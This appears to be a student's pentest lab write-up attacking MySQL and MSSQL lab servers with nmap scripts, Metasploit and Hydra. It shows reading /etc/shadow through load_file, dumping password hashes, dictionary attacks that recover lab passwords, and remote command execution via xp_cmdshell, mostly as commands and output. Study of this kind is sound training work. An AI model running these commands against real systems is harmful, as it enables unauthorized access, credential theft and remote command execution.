# MySQL

## Tools: 
- nmap

## Tasks

    1. What is the version of MySQL server?
    2. What command is used to connect to remote MySQL database?
    3. How many databases are present on the database server?
    4. How many records are present in table “authors”? This table is present inside the “books” database.
    5. Dump the schema of all databases from the server using suitable metasploit module?
    6. How many directories present in the /usr/share/metasploit-framework/data/wordlists/directory.txt, are writable? List the names.
    7. How many of sensitive files present in /usr/share/metasploit-framework/data/wordlists/sensitive_files.txt are readable? List the names.
    8. Find the system password hash for user "root".
    9. How many database users are present on the database server? Lists their names and password hashes.
    10. Check whether anonymous login is allowed on MySQL Server.
    11. Check whether “InteractiveClient” capability is supported on the MySQL server.
    12. Enumerate the users present on MySQL database server using mysql-users nmap script.
    13. List all databases stored on the MySQL Server using nmap script.
    14. Find the data directory used by mysql server using nmap script.
    15. Check whether File Privileges can be granted to non admin users using mysql_audi nmap script.
    16. Dump all user hashes using  nmap script.
    17. Find the number of records stored in table “authors” in database “books” stored on MySQL Server using mysql-query nmap script.

### Basic Scan
`nmap 192.111.166.3`
### Service Version and Port information | Find out version of mySQL server:
`nmap 192.111.166.3 -p 3309 -sV`

### Connecting to MySQL Server
`mysql -h 192.111.166.3 -u root`

### Look at Databases
`show databases;`

### Look at books Database, finding out how many records are present in table "authors"
    ,
`use books;`

    `books > `select count(*) from authors;`
    
    `select * from authors;`

    `exit`
**10 Records are present**

### Dump the schema of all databases from the server using suitable metasploit module:

`msfconsole`

    msf5: `use auxiliary/scanner/mysql/mysql_writable_dirs`
    
    msf5: `options`
    
    msf5: `set dir_list /usr/share/metasploit-framework/data/wordlists/directory.txt`
    
    msf5: `set rhosts 192.111.166.3`
    
    msf5: `set verbose false`: deactivates detailed status messages
    
    msf5: `advanced`: shows parameters

    msf5: `set password ""`

    msf5: `options`

    msf5: `run`

    msf5: `use auxiliary/scanner/mysql/mysql_schemadump`: rhost stays, because we set it as global before

    msf5: `set username root`

    msf5: `set password ""`

    msf5: `options`

    msf5: `exploit
    
    msf5: `exit`
![grafik](https://github.com/user-attachments/assets/9d60ceba-d2e1-40dd-8ed7-1cd35142316d)

### Finding out how many Directories present in /usr/share/metasploit-framework/data/wordlists/directory.txt are writable:

`mysql -h 192.111.166.3 -u root`

    `select load_file("/etc/shadow");`: check if we have access to the files on the system

    `exit`
![grafik](https://github.com/user-attachments/assets/cd5c55ea-c814-4732-9f28-428f3e0235b0)

### Finding out how many sensitive files present in /usr/share/metasploit-framework/data/wordlists/sensitive_files.xt are readable:

`use auxiliary/scanner/mysql/mysql_file_enum`

`set rhosts 192.111.166.3`

`set FILE_LIST /usr/share/metasploit-framework/data/wordlists/sensitive_files.txt`

`set PASSWORD ""`

`exploit`
![grafik](https://github.com/user-attachments/assets/827551f2-ef95-47d3-8120-1efbed49bf13)

### Finding the system password hash for user "root":

`mysql -h 192.111.166.3 -u root`
    `select load_file("/etc/shadow");`

hash: $6$eoOI5IAu$S1eBFuRRxwD7qEcUIjHxV7Rkj9OXaIGbIOiHsjPZF2uGmGBjRQ3rrQY3/6M.fWHRBHRntsKhgqnClY2.KC.vA/:17861:0:99999:7:::

### Users active on database server:
`msfconsole`

    `use auxiliary/scanner/mysql/mysql_hashdump`
    
    `set RHOSTS 192.111.166.3`
    
    `set USERNAME root`
    
    `set PASSWORD ""`
    
    `exploit`
![grafik](https://github.com/user-attachments/assets/10345d9e-9fa7-4a78-afb3-5879617b3a06)

### Checking if anonymous login is allowed on MySQL Server:
`nmap 192.111.166.3 -sV -p 3306 --script=mysql-empty-password`: checks if the MySQL server at the specified port is accessible with an empty password for the root user. Essentially, it attempts to connect to the MySQL service with an empty password to see if it’s allowed, which could be a security vulnerability if not properly secured.


### Checking if "InteractiveClient" capability is supported on the MySQL server.
`nmap 192.111.166.3 -sV -p 3306 --script=mysql-info`
![grafik](https://github.com/user-attachments/assets/d5f92601-ff91-4352-a114-32563020c5c6)

### Enumerating present users on MySQL database server using mysql-users nmap script:
`nmap 192.111.166.3 -sV -p 3306 --script=mysql-users --script-args="mysqluser='root',mysqlpass=''"`
![grafik](https://github.com/user-attachments/assets/f9599258-8385-4160-8ddd-9d3c4eb94ea9)

### Listing all databses stored on MySQL Server using appropiate Nmap Script:
`nmap 192.111.166.3 -sV -p 3306 --script=mysql-databases --script-args="mysqluser='root',mysqlpass=''"`
![grafik](https://github.com/user-attachments/assets/9e94565a-b425-4e52-980d-1fbd2c8aabee)

### Find data directory used by MySQL server using nmap script:
`nmap 192.111.166.3 -sV -p 3306 --script=mysql-variables --script-args="mysqluser='root',mysqlpass=''"`

### Checking whether file privileges can be granted to non admin users using mysql_audit nmap script:
`nmap 192.111.166.3 -sV -p 3306 --script=mysql-audit --script-args="mysql-audit.username='root',mysql-audit.password='',mysql-audit.filename='/usr/share/nmap/nselib/data/mysql-cis.audit'"`
![grafik](https://github.com/user-attachments/assets/6538eead-b99e-4230-bb62-3d4abd45a320)

### Dumping all user hashes using appropriate nmap script:
`nmap 192.111.166.3 -sV -p 3306 --script=mysql-dump-hashes --script-args="username='root',password=''"`
![grafik](https://github.com/user-attachments/assets/bb50ae0f-a313-4619-8e17-a293a0c2f8b8)

### Finding number of records stored in table "authors" in database "books" stored on MySQL Server using mysql-query nmap script:
`nmap 192.111.166.3 -sV -p 3306 --script=mysql-query --script-args="query='select count(*) from books.authors;',username='root',password=''"`
**10**
![grafik](https://github.com/user-attachments/assets/6515fdcd-0334-480f-b234-8bb0ddef0e73)

### Flag:

To extract just the password hash from the full entry in the /etc/shadow file, excluding the salt and hashing algorithm number, follow these steps:

Given the full entry:

perl

root:$6$eoOI5IAu$S1eBFuRRxwD7qEcUIjHxV7Rkj9OXaIGbIOiHsjPZF2uGmGBjRQ3rrQY3/6M.fWHRBHRntsKhgqnClY2.KC.vA/:17861:0:99999:7:::

Breakdown:

    $6$: This indicates the SHA-512 hashing algorithm.
    eoOI5IAu: This is the salt.
    S1eBFuRRxwD7qEcUIjHxV7Rkj9OXaIGbIOiHsjPZF2uGmGBjRQ3rrQY3/6M.fWHRBHRntsKhgqnClY2.KC.vA/: This is the actual password hash.

Extracted Hash

To get only the password hash without the salt or hashing algorithm, you take the part after the salt:

Password Hash:

S1eBFuRRxwD7qEcUIjHxV7Rkj9OXaIGbIOiHsjPZF2uGmGBjRQ3rrQY3/6M.fWHRBHRntsKhgqnClY2.KC.vA/

Summary

So the password hash for the root user, excluding the salt and hashing algorithm, is:

S1eBFuRRxwD7qEcUIjHxV7Rkj9OXaIGbIOiHsjPZF2uGmGBjRQ3rrQY3/6M.fWHRBHRntsKhgqnClY2.KC.vA/

# MySQL Dictionary Attack

This section contains how we would get a password if we have a certain username.

## Tools used:
- Metasploit
- Hydra

## Basic Scans
ip a = 192.145.232.3
nmap 192.145.232.3
nmap 192.145.232.3 -p 3306 -sV

### We enumerate the password of user "root" which is required to access the MySQL server using the tool Metasploit. 
We use the appropriate metasploit module with password dictionary: /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt

`msfconsole :scanner to brute force the login`
    `use auxiliary /scanner/mysql/mysl_login`
    `set rhosts 192.145.232.3`
    `set pass_file /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`
    `set verbose false`
    `set stop_on_success true`
    `set username root`
    `run`
    `exit`
We get the password: "catalina". 
![grafik](https://github.com/user-attachments/assets/0abd88a1-fc0e-4e1a-b397-215d608877b7)

### We enumerate the password of user "root" which is required to access the MySQL Server using the tool Hydra.
We use the appropriate metasploit module with password dictionary: /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt

`hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.145.232.3 mysql`

We get the password: catalina:
![grafik](https://github.com/user-attachments/assets/b9fcafb2-6d54-4bbb-963e-fb1afea0a1c5)

# MSSQL - Nmap Scripts

## Tools used:
- Nmap
- Nmap Scripts

## Basic Scans:
- `nmap 10.2.21.214`
- `nmap 10.2.21.214 -p 1433 -sV`
- `nmap 10.2.21.214 -p 1433 --script ms-sql-info`

## System Information
**- Port:** 1433/tcp open
**- Service:** ms-sql-s
**- Version:** Microsoft SQL Server 2019 15.00.2000

### We want to find Information about the target using NTLM:
`nmap 10.2.21.214 -p 1433 --script ms-sql-ntlm-info --script-args mssql.instance-port=1433`
We can enumerate following information:
Target_Name: MSSQL-SERVER
NetBIOS_Domain_Name: MSSQL-SERVER
NetBIOS_Computer_Name: MSSQL-SERVER
DNS_DOMAIN_NAME: MSSQL-Server
DNS_Computer_Name: MSSQL-Server
Product_Version: 10.0.14393

### We want to enumerate all valid MSSQL users and passwords:
`nmap 10.2.21.214 -p 1433 --script ms-sql-brute --script-args userdb=/root/Desktop/wordlist/common_users.txt,passdb=/root/Desktop/wordlist/100-common-passwords.txt`
We can enumerate following users:
- admin:anamaria => Login Success
- dbadmin:bubbles1 => Login Success
- auditor:jasmine1 => Login Success

### Enumerating users with empty passwords:
`nmap 10.2.21.214 -p 1433 --script ms-sql-empty-password`
We get following user with an empty password:
- sa:<empty> => Login Success

### Executing MSSQL query to extract sysusers
`nmap 10.2.21.214 -p 1433 --script ms-sql-query --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-query.query="SELECT * FROM master..syslogins" -oN output.txt`: Provides a logfile.
![grafik](https://github.com/user-attachments/assets/4e25b8ac-43a6-45bc-ac35-fca4c28bd0f7)
On the bottom right we can see the sysusers

### Dumping MSSQL users hashes
`nmap 10.2.21.214 -p 1433 --script ms-sql-dump-hashes --script-args mssql.username=admin,mssql.password=anamaria`: Provides us accounts and hashes
![grafik](https://github.com/user-attachments/assets/9e5557b8-f183-4f46-8769-fda2052358b3)
We enumerated following accounts:
- admin
- Mssql
- Mssql
- auditor
- dbadmin

### Dumping MSSQL users hashes
`nmap -p 1433 --script ms-sql-dump-hashes --script-args mssql.username=admin,mssql.password=anamaria 10.2.24.29`

### Execute a command remotely on the target server using xp_cmdshell using Nmap script.
`nmap 10.2.21.214 -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="ipconfig"`
We can run a ipconfig remotely on the target.

### Retrieving the flag
`nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="type c:\flag.txt" 10.2.24.29`
![grafik](https://github.com/user-attachments/assets/146434f5-ebce-457d-887b-03ad22e1b747)

# MSSQL - Metasploit

## Tools
- Nmap
- metasploit


## Basic Scans
- nmap 10.2.27.50
- nmap 10.2.27.50 -p 1433 -sV --script ms-sql-info

## System Information
- Port: 1433/tcp
- State: Open
- Service: ms-sql-s
- Version: Microsoft SQL Server 2019, 15.00.200.00; RTM

### Discovering valid users and passwords using metasploit:
`msfconsole` (bruteforce our way into user logon and password)
    msf6: `use auxiliary/scanner/mssql/mssql_login`
    msf6: `setg rhosts 10.2.27.50`
    msf6: `set user_file /root/Desktop/wordlist/common_users.txt`
    msf6: `set pass_file /root/Desktop/wordlist/100-common-passwords.txt`
    msf6: `set verbose false`
    msf6: `options`
    msf6: `run`

We were able to enumerate following users and passwords:
- sa:
- dbadmin:anamaria
- auditor:nikita


### Enumerate MSSQL configuration:
    msf6: `use auxiliary/admin/mssql/mssql_enum`
    
    msf6: `options`
    
    msf6: `run:`

We were able to enumerate following users with empty password:
- sa
So, we can access the sa user directory without entering the
password.

### Extract all MSSQL users:
    
msf6: `use auxiliary/admin/mssql/mssql_enum_sql_logins`

msf6: `exploit`
![grafik](https://github.com/user-attachments/assets/d314d84e-ae2a-4a08-9b9c-9bd762ea2905)

### Execute a command on the target machine using mssql_exec module:

msf6: `use auxiliary/admin/mssql/mssql_exec`

msf6: `set cmd whoami`

msf6: `options`

msf6: `run`
![grafik](https://github.com/user-attachments/assets/eb135ce7-65b4-4368-b037-6e3c83652a13)

### Running MSSQL enum domain accounts module to enumerate all available system users

msf6: `use auxiliary/admin/mssql/mssql_enum_domain_accounts`

msf6: `exploit`
![grafik](https://github.com/user-attachments/assets/ffcc3c24-605b-49b0-adfb-cfda09d879ec)
![grafik](https://github.com/user-attachments/assets/14e8b77a-eb7d-4447-87e7-de228b505389)









     
    
    



  
 










    

